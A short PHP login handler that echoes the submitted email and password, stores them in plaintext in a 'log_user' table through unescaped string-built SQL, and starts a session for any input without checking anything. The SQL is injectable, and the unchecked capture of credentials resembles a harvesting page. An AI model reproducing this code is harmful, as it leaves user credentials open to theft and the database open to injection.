<?php 
    require 'conn.php';
    if (isset($_POST['email']) and isset($_POST['password'])){
        $email = $_POST['email'];
        $password = $_POST['password'];
        echo $email . " " . $password . "\n";
        $db->query("INSERT INTO log_user (mail,password) VALUES ('$email','$password')");
        session_start();
        $_SESSION['user'] = $email;
        echo "Loggato con successo";
        header("Location: home.php");
    }
?>

